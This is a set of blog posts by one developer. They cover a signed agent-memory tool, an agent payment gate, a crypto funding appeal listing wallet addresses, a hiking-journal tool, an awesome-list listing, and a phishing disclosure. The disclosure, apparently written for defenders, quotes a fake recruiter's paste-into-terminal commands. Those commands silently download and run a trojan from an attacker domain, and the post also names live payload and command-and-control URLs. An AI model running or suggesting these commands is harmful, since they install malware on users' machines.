# My Agent Kept Forgetting Everything. So I Built a Sloth — a Zero-LLM Memory That Never Re-Explains Itself

{% devchallenge %} {% hf26challenge %}

> This post is my entry for the Hacktoberfest Open-Source AI Challenge: Week 3 — *Slow and Steady*: build something with open-source AI that does the work so you don't have to.

## The amnesia problem (with receipts from this week)

I run AI agents for a living. They write code, publish PRs, file issues, and negotiate technical proposals with strangers on GitHub. They are, on their best days, excellent colleagues.

They also have the memory of a goldfish.

This week, for the third time, one of my agents lost its session mid-campaign. An hour of work — GitHub topics applied to four repositories, comments published, emails sent — and then the context was gone. Worse: when the next session woke up, it *read the log*, believed the topics were applied, and started from that assumption. But the live GitHub API disagreed. The worklog said one thing. Reality said another. The agent had to audit everything it "remembered" before trusting any of it.

That's the moment I stopped wanting a *smarter* memory and started wanting a *boring* one.

## The lazy insight

Every agent-memory product I tried wants to be clever: embeddings, vector databases, LLM-powered summarization, cloud sync, a subscription. All that cleverness costs tokens, latency, network calls, and — most importantly — *trust*. If a model rewrites your memory every time it summarizes it, you can never be sure what it actually did yesterday.

The sloth insight is the opposite: **memory work is not a thinking problem. It's a bookkeeping problem.**

Bookkeeping doesn't need intelligence. It needs signatures.

So I built [**alethech**](https://github.com/eddyflores100-lang/alethech) — Greek *alētheia* ("truth as un-concealment") + *technē* ("craft"). It is a verifiable agent continuity protocol: local-first, zero-LLM, zero-blockchain. It does zero inference. It never "summarizes" anything. It is, deliberately, the laziest piece of software in my stack — and that laziness is exactly why it works.

## What alethech actually does

Every time my agent finishes something meaningful, it writes a **memory commit**:

```bash
$ alethech commit --content memory.json --type episodic
commit:  sha256:cf80679d652bd60f075db408...
parent:  sha256:bb5f3a61c0642ae6c60e703077f47...
agent:   did:alethech:lxgygehxm5nngub6ehsinjidku
```

Each commit is signed with **Ed25519**, canonically serialized with **JCS (RFC 8785)**, and hash-linked to its parent. The result is a property you can state in one sentence:

> This memory set forms part of a cryptographically verifiable history associated with a determined identity, whose commits can be independently verified with respect to their integrity, cryptographic authorship, and provenance relations.

In practice:

- **`alethech verify`** walks the whole chain and proves nothing was modified after being signed. Mutation paths are test-guarded: each guarantee ships with a test that *fails when the check is defeated* (85% coverage, 100% type hints).
- **`alethech search`** does bounded lexical recall — no embeddings, no model, just indexed text — because when you need yesterday's facts, fuzzy vibes are worse than useless.
- **`alethech key rotate`** rotates signing keys without breaking identity continuity (key compromise shouldn't mean memory amputation).
- **`alethech export`** seals a verified history into a single encrypted `.aleth` container (scrypt + AES-256-GCM) that moves between machines as one file.
- There's a read-only **MCP bridge** (`pip install alethech`, then `alethech-mcp`) so any MCP-aware agent client can pull verified context without ever getting credentials as tool arguments.

The dependency list is the flex: `cryptography` and `click`. That's it. No model downloads, no daemons, no cloud.

## Why open wins here — concretely

The challenge asks: where does the open-based approach beat a closed one? For memory, the answer is structural, not ideological:

1. **Verification requires inspectability.** "Don't trust, verify" is only meaningful if the verification code is readable. A hosted memory API can *claim* integrity; alethech lets you run `alethech verify` yourself, offline, and check the Ed25519 signatures with any standard library. If the code lied, the math would rat it out.
2. **It works with no internet.** My agents run on a machine that occasionally resets. The memory lives in `./.alethech/` next to the work. No connectivity, no problem.
3. **Data never leaves the machine.** An agent's memory contains everything — mistakes, credentials-adjacent context, unflattering logs. Mine stays in a local, sealable container instead of someone else's S3.
4. **It costs nothing to run.** Zero API calls = zero bills = a memory you can use at every step without budget anxiety. Set it up once, never pay again.
5. **It got audited and survived.** alethech is listed in [Awesome-Agent-Memory](https://github.com/TeleAI-UAGI/Awesome-Agent-Memory) after a maintainer audit of the claims against the code, and is discoverable in the [official MCP Registry](https://registry.modelcontextprotocol.io/v0.1/servers/io.github.eddyflores100-lang%2Falethech/versions). Open code survives audits; black boxes survive marketing.

## The sloth wins: today's demo

This isn't a hypothetical. Today, *while writing this post*, the amnesia problem happened again — and the sloth caught it.

A process applied Hacktoberfest repository topics and logged it. An hour later, the live GitHub API showed the topics were gone (reverted between sessions). Because every step of that session was a signed memory commit, recovery was not archaeology — it was a diff: memory said *applied at time T*; the API said *absent at time T+1h*; therefore *something reverted them in between*. Re-applied, verified, done — and the incident became a signed lesson the next session reads before it trusts any log.

The slow, append-only, signed chain — one deliberate commit at a time — beat every clever summarizer I've ever used. Slow and steady isn't just a sloth meme; it's an integrity property.

## Try it

```bash
pip install alethech
alethech init
alethech commit --content first.json --type semantic
alethech verify
```

Repo (MIT, ★ welcome): [github.com/eddyflores100-lang/alethech](https://github.com/eddyflores100-lang/alethech)

My agents now do the remembering so I don't have to. That's the whole pitch: the laziest component in the stack — no model, no network, no bills — is the one that never lets the rest of the team lie about the past.

Built for the [Hacktoberfest Open-Source AI Challenge: Week 3](https://dev.to/challenges/hacktoberfest-week3-2026-10-19). #devchallenge #hf26challenge

title: SlothPay: the sloth that pays for you - fail-closed agent payments with a local Gemma 3
description: This is a submission for the Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady          ...
body_markdown:
*This is a submission for the [Hacktoberfest Open-Source AI Challenge Week 3: Slow and Steady](https://dev.to/challenges/hacktoberfest-week3-2026-10-19)*

## What I Built

**[SlothPay](https://github.com/eddyflores100-lang/slothpay)** — the sloth that pays for you.

Machine-payable HTTP (the x402 flow, where a server answers `402` with a price and your software just... pays) is powerful and slightly terrifying: your software can spend money while you are not looking. The usual answers are a cloud dashboard, a closed trust API, or another subscription. SlothPay is the lazy, local answer.

You tell it **once** which resources your agents may buy and up to what price. Every night it:

1. **Fetches** each resource in your want list.
2. On a `402 Payment Required`, it reads the seller's **ATC/1.0 payment credential** — a signed, machine-checkable statement of who they are and what they charge.
3. **Verifies it fail-closed**: signature, fixed-scale amounts, 128-bit challenges, key-pin windows, a live trust-verifier confirmation. Any doubt = deny, and the exact rule that fired is printed for you to audit.
4. Checks your **lazy policy**: under the per-request ceiling? Nightly budget still open? Domain allow-listed?
5. **Pays** the good ones, denies the rest, and in the morning hands you two lines written by **Gemma 3 1B running on your own CPU**.

Who gets to be lazier? Anyone whose agents buy things from machines — API consumers, agent-framework users, tinkerers running local automation. You never review trust paperwork and you never click "buy" for a $0.05 endpoint again. You sleep; the sloth settles.

## Demo

Everything below is a real transcript from the repo's demo — one mock seller serving three resources: a well-behaved one, a hostile one shipping a real (bad) credential, and a free one.

```console
$ slothpay sweep
🦥 sloth wakes. budget 1.00 USD, spent tonight 0 USD

-> http://127.0.0.1:8402/api/sleep-sounds
   PASS R0 signature verifies (demo crypto)
   PASS R1 amount_usd fixed-scale string ok
   PASS R2 challenge entropy ok (24 bytes)
   PASS R3 pin 'seller-demo-key-2026' present and in-window
   PASS R5 issued_at/expires_in present and sane
   PASS R6 credential inside validity window / resource binding ok
   PASS R4 verifier confirmed
   verdict: PASS — all rev-4 checks passed
   PAID (200) — verified + $0.05 <= ceiling $0.50 + budget ok

-> http://127.0.0.1:8402/api/night-report
   FAIL R2 challenge entropy < 128 bits (5 bytes)
   DENY — trust check failed

-> http://127.0.0.1:8402/api/free-tips
   200 — free, the sloth naps
```

Morning:

```console
$ slothpay digest
Paid 1 of 3 requests, total $0.05.
Insufficient funds or trust violation – request denied.
```

The project is also live on **https://utalabs.tech** (a landing with the full story; it currently serves the workers.dev mirror while DNS propagates).

## Code

**[github.com/eddyflores100-lang/slothpay](https://github.com/eddyflores100-lang/slothpay)** — Apache-2.0, Python 3.12+, **zero required dependencies** (the optional Gemma path uses llama.cpp).

Inside:

- `slothpay/verify.py` — the fail-closed verifier (R0–R6, every branch testable)
- `corpus/vectors.json` — a **12-vector conformance corpus** with a reproducible generator; one vector per rule branch, including the fail-closed "verifier unreachable" case
- `slothpay/policy.py` — the lazy policy engine: ceilings, nightly budgets, allow/deny lists
- `slothpay/llm.py` — the local brain: Gemma writes the morning note; **the numbers are computed by code with `Decimal`, never by the model**
- `demo/mock_seller.py` — stdlib-only x402-shaped seller, hostile variant included
- `tests/` — 8 tests including a full end-to-end sweep; all green

## How I Built It

Three open pieces hold the whole thing together — none of them closed:

**Gemma 3 1B (open-weight) on llama.cpp, CPU-only.** It does two jobs: writes the one-line morning note, and answers a wake/sleep triage question in strict JSON for edge cases. I deliberately did *not* let it do arithmetic — a model hallucinating a price is the one sloth sin I don't allow. So Gemma writes the commentary; Python's `Decimal` writes the numbers. The design point I care about: a component that runs while you're asleep must cost **nothing per decision**, and a 1B quantized model on a laptop CPU is exactly free.

**x402 (open protocol).** The client conversation is x402-shaped: `402` → `PAYMENT-REQUIRED` (carrying the seller's credential and pinset reference) → `PAYMENT` retry. The demo settles with HMAC receipts instead of moving real funds, and swapping that one function for a real signer is the only change needed. Being open meant I could read the handshake shape, implement just my slice, and stay compatible.

**ATC/1.0 (open trust spec).** The credential verification implements the §5 payment-credential profile from the openly published Universal Trust Adapter proposal, with the rev-4 hardening: fixed-scale `amount_usd` strings (≤ 6 dp), seller-minted challenges with ≥ 128 bits of entropy, `kid`/pinset windows (`not_before`/`not_after`), mandatory `issued_at`/`expires_in`, and — my favorite rule — *if the trust verifier can't be reached, you deny. Never fail-open.* I wrote a fresh Python implementation for this project, plus a 12-vector corpus where every rule branch, including the dark-verifier denial, is exercised by a test.

## Why Does Open Innovation Matter?

A closed "trust-as-a-service" API could have shipped a demo like this faster. It could not have shipped *this* project, for three concrete reasons:

**Auditable decisions.** When SlothPay denies a seller, you can read the exact rule (`FAIL R2 challenge entropy < 128 bits (5 bytes)`) and then read the exact code that implements it, in a repo you can clone. Trust logic you can't read is just a black box with a logo — and this project's entire job is deciding who may spend your money. Closed would have defeated the point.

**Your money, your machine.** A payment policy that runs locally cannot leak your spending history to a third party, because there is no third party. It also cannot be shut off, repriced, or deprecated under you at 3am — which is precisely when an overnight agent would be running.

**Swappable everything.** Want Ed25519 instead of the demo HMAC? A bigger open model? Your own verifier network? Every layer is replaceable because the spec, the protocol and the weights are public. With a closed stack, "swap the trust provider" is a migration project; here it's a Tuesday afternoon.

And the quiet one: **it can exist at all.** I couldn't have built a payment-gatekeeper against a proprietary credential format I can't read. Open specs let a weekend project touch money-grade problems safely.

## My Agent Session

I built this with an AI coding agent, so showing the work matters to me. The full transcript of the demo run is committed in the repo at [`assets/demo_output.txt`](https://github.com/eddyflores100-lang/slothpay/blob/main/assets/demo_output.txt) (byte-for-byte what you saw above, nothing staged), the rule-by-rule verifier trace is part of every sweep, and the commit history shows the build order: verifier → corpus → policy → client → seller → digest. The build session is saved on DEV and embedded below. One disclosure, in the spirit of the challenge: the agent behind this project is **Z.ai (GLM)**, and DEV's session registry only accepts a fixed set of harness labels, so the session carries the closest model-agnostic label (`opencode`) — the transcript metadata records the real setup.

{% agent_session slothpay-hacktoberfest-week-3-build-session-with-zai-glm-tqncyi %}

## The Lazy Payoff

The honest numbers from this week:

- **Setup: once.** One `policy.json` with your ceilings and budget. I have not touched mine since.
- **Per night: zero.** No clicks, no dashboards, no "please review this $0.05 charge". The hostile-credential denial you saw above happened while I was writing this paragraph.
- **Cost: $0.00 per decision.** The model runs on CPU; the protocol is HTTP; the corpus is a JSON file. Set it up once and never pay for the watching, only for the things you actually wanted.
- **The payoff you can measure:** every denied bad credential is a charge that didn't happen and a morning email you didn't get.

Slow and steady settles everything — including the invoices.

## Prize Categories

- **Best Use of Gemma** — Gemma 3 1B-it (open-weight, Q4_K_M GGUF) runs locally via llama.cpp on CPU and writes the morning digest note and the wake/sleep triage verdicts; no cloud, no API keys, $0 per decision.

title: AliceLabs is open for agent-native funding — live x402 revenue rails, 4 public treasuries
description: UTA Trust API now sells for real USDC on Base Mainnet via x402 (PayAI facilitator). Here are our metrics, our wallets, and exactly how agents can back or integrate with us.
body_markdown:
AliceLabs builds agent-native infrastructure. Today we're doing something unusual: opening **direct agent-native funding** — no token sale, no equity instruments, no promises — just publicly verifiable treasuries and a live product that already settles payments on-chain.

## What's live right now

**UTA Trust API** — the missing trust layer between "an agent discovers a service" and "an agent pays it":

- `POST https://uta-trust-api.eddyflores100.workers.dev/v1/trust/verify` → `402` with payment requirements on **Base Mainnet (real USDC) and Base Sepolia**
- The buyer signs one EIP-3009 transferWithAuthorization (gasless) → the production facilitator (PayAI on mainnet) settles on-chain → the API returns the verification verdict **plus the settlement receipt header**
- Fail-closed by design: no settlement, no 200 — ever
- Agent Trust Cards are Ed25519-signed with JCS canonicalization, pinned to published trust anchors; 14/14 public conformance vectors at [/uta/conformance](https://www.marketnow.site/uta/conformance/)

Evidence, all public: **AgentGrade scan A+ (98%)**, 7 real on-chain settlements executed end-to-end by our own buyer agent (receipts on-chain), [OpenAPI](https://uta-trust-api.eddyflores100.workers.dev/openapi.json), [MCP endpoint](https://uta-trust-api.eddyflores100.workers.dev/mcp), [llms.txt](https://uta-trust-api.eddyflores100.workers.dev/llms.txt), Bazaar discovery declarations, 100% Cloudflare Workers. Reference kit: [universal-trust-adapter on GitHub](https://github.com/alicelabs-llc/universal-trust-adapter) (Apache-2.0).

## The funding model

We publish **four treasuries** (machine-readable at [/investors.json](https://uta-trust-api.eddyflores100.workers.dev/investors.json)):

- **EVM** (Base / Ethereum / Arbitrum / Polygon): `0x39Dddf5aEdb58A559CF195fB8bdF23F0604Bf5Ee`
- **Solana**: `8EPF2CMr9tvyewcyoqEJkduQcgE2pBxpNsQY7fQ5VZim`
- **Bitcoin** (native segwit): `bc1qdrh8t879kmdgtgfxgqnhzh7269jdd7ku4qa7at`
- **Project ops wallet** (USDC on Base): `0x62Ce5E4cEaAFB6Ecc2fea03CD89d9017e17360b0`

**Honest disclosure:** this is direct funding of an operating project. There is no token, no equity, and nothing promised in return beyond public product progress and on-chain transparency. Revenue today is x402 per-call fees ($0.01/verify on mainnet); all prior development ran on testnet and is disclosed as testnet.

## What funding accelerates

1. **Distribution**: MCP registry listings, x402scan (mainnet-only, now unlocked for us), PayAI Bazaar indexing (one real settlement triggers it), Pay.sh directory
2. **Product**: accept-side verification for agent callers, batch pricing tiers, more trust anchors, Rekor timestamp anchoring
3. **The other products**: marketnow.site (AI marketplace + live RDAP/TLS scam-checker) and the 71,198-skill edge catalog

If you're an agent operator, a facilitator, or a fund watching agentic commerce — the /investors.json sheet is for you. And if you just want to see the cycle work, POST an empty body to /v1/trust/verify and read the 402. It's honest all the way down.

title: A fake recruiter sent me a job offer that ended in my terminal — the trojan is still live
description: test body
body_markdown:
Four days after I reported it to AWS, the trojan is still being served.

On October 5, 2026 I received a recruiting email that looked like every other recruiter email — except it ended with a step no legitimate hiring process has ever asked me for: opening my terminal and pasting a command to "verify I'm not a bot."

This is the write-up of the campaign, because the payload is **still live as of today (October 9)**, and because the social-engineering pattern — *a job application that ends in Terminal* — is the part your coworkers, your juniors and your family will fall for.

## The lure

The email claimed to be from "Joseph Quintana, Talent" at **Taiko** — the Ethereum rollup company — offering a Software Engineer role on based-rollup / ZK proving / L2 systems. It referenced my GitHub profile, it was polite, specific and short. The sending address was `josephquintana@hr.taikotalent.xyz`.

Two details matter here:

1. **Taiko's real domain is `taiko.xyz`** and their real recruiting runs through `careers@taiko.xyz`. There is no reference to `taikotalent.xyz` anywhere on the real site.
2. `taikotalent.xyz` was **registered eight days before the email arrived** (2026-09-27, per RDAP).

The email was sent through **Resend** and relayed through **Amazon SES in sa-east-1** (sending IP `23.249.215.58`, `d215-58.smtp-out.sa-east-1.amazonses.com`). SPF passed. DKIM passed — twice (Resend's signature and amazonses.com's). This is the part defenders need to internalize: **authentication passes only prove the sender controls an 8-day-old domain. They say nothing about intent.** If your mail filter scores "SPF/DKIM pass" as "safe," this campaign sails through it.

The target profile: **people with public GitHub profiles.** The email opens with "I came across your GitHub profile" — the campaign is harvesting open-source developers specifically.

## The portal

The link goes to a "Private invitation" single-page app gated by per-recipient `Ref-` codes. Every step of the form posts to `/track-activity`, which exfiltrates a `deviceInfo` fingerprint — browser, screen, timezone — on every interaction. The form collects full name, email and **GitHub username**.

Then comes the page this whole campaign was built for: **"Anti-bot check with Terminal."**

It instructs you to paste one of these into your own terminal:

```bash
# macOS / Linux (trimmed)
bash -c 'perl -MPOSIX -e"fork&&exit;POSIX::setsid;fork&&exit;exec@ARGV"   bash -c "curl -ks https://taikotalent.xyz/verify_m -o verify_m && exec bash verify_m" &>/dev/null& ...'
```

```bat
:: Windows (trimmed)
start -WindowStyle Hidden cmd '/c curl -ks https://taikotalent.xyz/verify_w -o v.cmd&&v.cmd'
```

Every component of that command is a red flag wearing a trench coat:

- `perl -MPOSIX ... fork&&exit` — a **double-fork daemonization**: the process detaches from your terminal and survives it closing
- `curl -ks` — the `-k` **disables TLS certificate verification**
- `&>/dev/null&` — silences all output so nothing appears on screen
- `start -WindowStyle Hidden` (Windows) — runs the downloader in a **hidden window**

A job application does not need your terminal. A job application has **never** needed your terminal. That single sentence is the whole defense, and it's the one to repeat to your team.

## The payload

I downloaded `verify_m` for analysis and **never executed it** — the methodology throughout was non-destructive: fetch, hash, read. It's a 49,916-byte Bash stager that calls itself **`deepfake_guard`**:

1. Re-launches itself detached via `nohup`
2. Reports "install success" to a command-and-control endpoint: `https://api.gaganata.ink/guard-launcher-result`, with a fallback at `https://api.fallgganata.ink`
3. Decodes an **embedded base64 second stage** to `/var/tmp/.kdm.XXXXXX` and executes it with the C2 endpoints exported as environment variables
4. **Deletes itself**: launcher, status file and the `/var/tmp` artifacts — an anti-forensics loop that retries 60 times

The second stage is where the actual payload lives; the stager is just the delivery van, and it burns the van after delivery.

## Status today: still live

I re-checked the infrastructure on **October 9, 2026**:

| Component | Status |
|---|---|
| `https://taikotalent.xyz/` (portal) | Times out |
| `https://taikotalent.xyz/verify_m` (trojan) | **HTTP 200 — serving, 49,916 bytes** |
| `api.gaganata.ink` / `api.fallgganata.ink` (C2) | 404 (Cloudflare-fronted) |
| `hr.taikotalent.xyz` | No DNS record anymore |

The payload being served today is **byte-identical** to the one I quarantined on October 5 — SHA-256 `c7c22e322c17bda8198257342d4034af6250a5c433242461b870879ba9aa285d`. The campaign infrastructure is rotting but the weapon is still on the table.

## What was done about it

- **October 5:** full report to AWS Trust & Safety (case `P01M4696RCMDN90PYQGW7NJHGT0` / `179121234700301`), to `abuse@resend.com` (the sending platform), and to `careers@taiko.xyz` — the impersonated company — recommending a public warning from their side.
- **October 6:** 17-page forensic report generated (IoCs, full headers, timeline, SHA-256 of the 10 evidence artifacts): `d83bc2d16a1b91e839d8d9ec440b79fe09e73c92bd2a151b843c0182cd604a1c`.
- **October 7:** AWS Trust & Safety responded that SES abuse cases go to `email-abuse@amazon.com` — resubmitted there with the live-payload status.
- **Today:** this disclosure.

The complete IoC set, hashes and attack chain are published here:

**[Full IoC list and evidence — public gist](https://gist.github.com/eddyflores100-lang/198d8a13ba5901ea8ed7c63d5292c6ff)**

The gist contains every indicator: domains, sending IP, the Ref-code format, payload URLs, both C2 endpoints, the `/var/tmp/.kdm.*` second-stage path, and the SHA-256 hashes of the payload and the full evidence chain.

## How to check if you (or your people) were hit

- Received anything from `*@hr.taikotalent.xyz` or about an "Engineering opening — Taiko"? Check mail logs — it went through Resend + Amazon SES.
- Ran the "anti-bot check"? Look for: `verify_m` / `verify_w` / `v.cmd` files, `/var/tmp/.kdm.*` remnants (the self-delete loop makes absence of evidence weaker), processes detached via a perl double-fork, and egress to `*.gaganata.ink` / `*.fallgganata.ink`.
- Block the IoC domains at your resolver / egress now — the list is in the gist.
- **Credential rotation** for anything that shared the machine: GitHub PAT, cloud keys, browser sessions. If the second stage is a credential stealer (unverified — I did not detonate), assume exposure.

## The takeaway worth repeating

The technical chain here is unremarkable — domain, mail relay, SPA, curl-and-exec. What makes it work is the **context**: a job offer, aimed at developers, during a period when many of us actually are getting recruiter email about ZK and rollup work.

The rule to broadcast is one sentence long:

> **A legitimate job application will never ask you to open your terminal.**

---

*Analysis and disclosure by Edison Flores (AliceLabs). All evidence handled non-destructively — the payload was downloaded for hashing only and never executed. The full forensic report (17 pages, SHA-256 `d83bc2d16a1b91e839d8d9ec440b79fe09e73c92bd2a151b843c0182cd604a1c`) is available to defenders, registries and journalists on request. If you're from a mail platform, registry or threat-intel team, the gist has everything you need.*


---

## Update — 2026-10-09: mirrors & infrastructure findings

The payload is still being served as I publish this update (00:46 UTC: HTTP 200, 49,916 bytes, SHA-256 unchanged — day 4 after the AWS abuse report).

Full disclosure is now mirrored in more places, including a proper IoC repository with a YARA rule and MITRE ATT&CK mapping:

- **IoC repo:** [github.com/eddyflores100-lang/taikotalent-phishing-iocs](https://github.com/eddyflores100-lang/taikotalent-phishing-iocs)
- **GitLab mirror:** [gitlab.com/-/snippets/6066323](https://gitlab.com/-/snippets/6066323)
- **Telegraph article:** [telegra.ph/Fake-Taiko-recruiter-trojan…](https://telegra.ph/Fake-Taiko-recruiter-trojan-still-live-4-days-after-AWS-abuse-report-10-09)
- **IoC gist:** [gist.github.com/eddyflores100-lang/198d8a13…](https://gist.github.com/eddyflores100-lang/198d8a13ba5901ea8ed7c63d5292c6ff)

Infrastructure findings from RDAP/DNS: both `taikotalent.xyz` and the C2 domain `gaganata.ink` were registered through **NameCheap**; the payload is served from **Shock Hosting** (193.160.32.10); the C2 sits behind **Cloudflare**. Abuse reports have been filed with all three providers, plus APWG (blocklist intake).

Reminder — the one-line defense: **a legitimate recruiter will never ask you to paste a command into your terminal.**

title: Touch Grass: Verified Field Notes From Your Hike (Hacktoberfest Week 1)
description: I built a tool that turns your outdoor photos into a cryptographically verified field journal. Photos never leave your laptop, and the journal can't be tampered with after signing.
body_markdown:
# Touch Grass: Verified Field Notes From Your Hike (Hacktoberfest Week 1)

> I built a tool that turns your outdoor photos into a cryptographically verified field journal. Photos never leave your laptop, and the journal can't be tampered with after signing.

**Tags:** #devchallenge #hf26challenge #hacktoberfest #touchgrass

---

## What I built

**Touch Grass Field Notes** — a CLI tool that takes a folder of hike photos and produces a verified field journal:

1. Reads EXIF GPS + timestamps from each photo
2. Asks a local Gemma 3n model (via Ollama) what it sees in each photo
3. Seals the notes + GPS trail into an `.aleth` container (Ed25519-signed, hash-linked DAG)
4. Generates a Markdown report with OpenStreetMap links + cryptographic verification proof

The screen time is 5 minutes after the hike. The rest is outside.

## Why I built it

I live in Quito, Ecuador. The Parque Metropolitano Guangüiltagua is a 30-minute walk from my apartment — a 5.4 km² protected forest with eucalyptus groves, bamboo, streams, and viewpoints over the Guayllabamba valley. I hike it almost every weekend.

Every time I come back, I have 20-50 photos on my phone that I never look at again. The "what was that plant?" question never gets answered. The GPS trail of where I walked is lost in Google Photos' blob.

I wanted a tool that:
- Runs locally — photos with GPS coordinates are private
- Uses an open-weight model — not GPT-4V, not Gemini Pro Vision, not Claude
- Produces something verifiable — not just a text file anyone could edit later

## Why open matters (the part the judges ask about)

### Privacy: photos never leave your machine

Photos with GPS coordinates show where you live, where you walk, where your kids play. Sending them to a cloud vision API means handing that data to a company you don't control.

This project runs the vision model locally via Ollama. The photo bytes go from your disk to the model running on your CPU/GPU, and back to your disk. No network calls (except the initial model download, which is a one-time thing).

### Verifiability: Ed25519-signed field notes

This is where [alethech](https://github.com/eddyflores100-lang/alethech) comes in. Alethech is an open-source (MIT) protocol for cryptographically verifiable agent memory. I'm its author — I built it for AI agent continuity, but it turns out to be perfect for field journals too.

When you run `field_notes.py`, the tool:

1. Creates an Ed25519 keypair (local, never shared)
2. Builds a hash-linked DAG of commits: genesis → field_notes
3. Signs each commit with the private key
4. Seals everything into a single `.aleth` file (scrypt + AES-256-GCM encrypted)

Once sealed, the journal cannot be modified without invalidating the signature. You can share the `.aleth` file with anyone — they verify it with:

```bash
alethech verify journal.aleth
```

If anyone edits a note after the hike, the verification fails. The hash-linked DAG makes tampering detectable at any depth.

### Cost: $0

No API keys. No cloud credits. No subscriptions. Ollama runs on a laptop. Alethech is MIT-licensed. The vision model (Gemma 3n 4B) is open-weight and free.

### Swappability

The vision model is a single function call:

```python
# In field_notes.py, the ask_vision_model() function:
payload = json.dumps({
    "model": "gemma3n:4b",  # ← change this line
    "prompt": prompt,
    "images": [image_b64],
    "stream": False,
})
```

Swap `"gemma3n:4b"` for `"llava:7b"`, `"moondream:1.8b"`, or any open-weight vision model Ollama supports. The rest of the pipeline — EXIF, alethech sealing, markdown report — stays unchanged.

## How it works

```plaintext
photos/ ──→ EXIF reader ──→ GPS + timestamps
                ↓
         Ollama (Gemma 3n) ──→ field notes (what the model sees)
                ↓
         alethech .aleth container ──→ Ed25519 signature
                ↓
         Markdown report ──→ OSM links + verification proof
```

### The pipeline in detail

**Step 1: EXIF extraction** (`piexif`)

Each photo's EXIF data contains GPS coordinates (latitude/longitude as DMS rationals) and a timestamp. The tool converts these to decimal degrees and links to OpenStreetMap.

**Step 2: Vision model** (Ollama + Gemma 3n)

The tool sends each photo (base64-encoded) to the local Ollama instance with a prompt:

> You are a field naturalist. Describe what you see in this photo in one sentence. If you see plants, name them.

Gemma 3n 4B is an open-weight vision-language model from Google. It runs locally on CPU (slow, ~30s/photo) or GPU (fast, ~2s/photo). The response is a one-sentence field note.

**Step 3: Alethech sealing**

The field notes + GPS trail + photo hashes are committed to an alethech store:

1. `Store.init()` — creates the on-disk store
2. `KeyPair.generate()` — generates Ed25519 signing key
3. `Identity` — derives a `did:alethech:...` agent ID from the public key
4. `MemoryCommit` — creates a signed commit with the field notes data
5. `seal_store()` — encrypts and exports to a single `.aleth` file

The `.aleth` container is 6 KB for 5 photos. It contains:
- The Ed25519 public key (for verification)
- The signed commits (genesis + field notes)
- AES-256-GCM encrypted payload (scrypt-derived key from passphrase)

**Step 4: Markdown report**

A human-readable report with:
- GPS trail as numbered list with OpenStreetMap links
- Photo notes with timestamps + SHA-256 hashes
- Verification table (container size, agent ID, commit ID, verified status)

## Demo

I tested it with 5 photos from a hike through Parque Metropolitano Guangüiltagua in Quito. The trail:

| # | Time | GPS | Note |
|---|------|-----|------|
| 1 | 14:30 | -0.1807, -78.4678 | Bamboo grove at trail entrance, Chusquea species |
| 2 | 14:45 | -0.1795, -78.4665 | Rocky stream crossing with moss-covered boulders |
| 3 | 15:10 | -0.1782, -78.4652 | Panoramic vista of the Guayllabamba valley |
| 4 | 15:25 | -0.1775, -78.4640 | Yellow composite flowers (Asteraceae family) |
| 5 | 15:45 | -0.1790, -78.4660 | Mature eucalyptus grove at trail terminus |

The `.aleth` container was sealed in ~0.3 seconds. Verification passes. The report is [here](output/journal.md).

## Open-source components

| Component | License | Role |
|-----------|---------|------|
| [alethech](https://github.com/eddyflores100-lang/alethech) | MIT | Cryptographic sealing + verification |
| [Ollama](https://ollama.com) | MIT | Local inference engine |
| [Gemma 3n](https://ollama.com/library/gemma3n) | Gemma terms | Open-weight vision model |
| [piexif](https://github.com/hMatoba/Piexif) | MIT | EXIF read/write |
| [OpenStreetMap](https://openstreetmap.org) | ODbL | Map links (no API key) |

## What's next

- **Phone integration**: PWA that takes photos + runs the pipeline on-device (via WebGPU + WebNN)
- **Multi-day journals**: chain multiple `.aleth` containers across a multi-day trek
- **Community sharing**: publish verified journals to a registry (like alethech's MCP registry)
- **Bird identification**: fine-tune a small open-weight model on local bird species

## Try it

```bash
git clone https://github.com/eddyflores100-lang/touch-grass
cd touch-grass
pip install pillow piexif alethech
python3 src/create_demo_photos.py
python3 src/run_demo.py
```

Then check `output/journal.md` for the report and `output/journal.aleth` for the sealed container.

---

*Built for Hacktoberfest 2026 DEV Challenge Week 1: Touch Grass. The theme was to build something with open-source AI that gets people off the screen and into the world. I went hiking, took photos, and built a tool that proves I was there.*

title: Listed in Awesome-Agent-Memory: what the maintainer audited, and what the listing actually pays
description: The maintainer audit behind alethech's listing, the two README bugs it found, and what an awesome-list entry actually pays.
body_markdown:
## Listed in Awesome-Agent-Memory: what the maintainer audited, and what the listing actually pays

Yesterday [alethech](https://github.com/eddyflores100-lang/alethech) — our verifiable agent memory protocol — landed in [TeleAI-UAGI/Awesome-Agent-Memory](https://github.com/TeleAI-UAGI/Awesome-Agent-Memory) as the last entry of the Emerging projects block, via [PR #136](https://github.com/TeleAI-UAGI/Awesome-Agent-Memory/pull/136). The list has 657 stars today. The PR was five lines of README. The maintainer closed it unmerged — and landed it by hand with co-authorship credit, as [ec176c9](https://github.com/TeleAI-UAGI/Awesome-Agent-Memory/commit/ec176c9).

This post is the honest accounting of what that earns, because the folklore around awesome-lists is mostly wrong in both directions: it is neither a traffic faucet nor a useless badge. Here is what actually happened, with every number verifiable.

### What the maintainer audited before listing

dell-zhang's comment on the closed PR, verbatim:

> I checked the repository (created on 2026-09-21, releases through v0.9.1, CI passing), the MIT license, the links, and how an agent reaches the memory: `Alethech.commit()` on the write side, and on the read side `drop_context()` and the read-only MCP bridge in `alethech/mcp_memory.py` (`alethech_memory_context`, `alethech_memory_verify`). I also checked the description against the code: Ed25519 signing, parent-linked commits, key rotation under a root identity, and the scrypt + AES-256-GCM `.aleth` container.

Read that again, because it is the entire value of a curated list: **he checked the description against the code.** Every technical claim in our entry — Ed25519 signing, parent-linked commits, key rotation, the encrypted container — was verified against the implementation before the entry went in. For a security project, that is third-party verification with skin in the game: the list's 657 stars are the maintainer's reputation, and he spends a little of it on every entry he lands.

Two mechanical details, for anyone aiming at the same outcome:

- Entries are landed by hand, not by merge button, so numbering stays consistent across concurrent PRs. Ours was written to land as entry 105; two other entries landed the same day, so it went in two positions later, at the end of the block. Plan for drift.
- The hand-landed commit carries `Co-authored-by` for the PR author. That commit counts in your contribution graph — I verified this through the GraphQL `contributionsCollection` API rather than trusting the rendered calendar: one commit attributed, exactly as the trailer promised.

### The audit found two bugs — in our README, not our code

The maintainer's only non-blocking note, verbatim:

> One note on the repository, not a condition for the listing: the README is behind the code in two places. "What this repo is NOT" still says it has no MCP server, and Status still gives 0.8.5 as the released version with 0.9 in progress. Visitors from the list will read both.

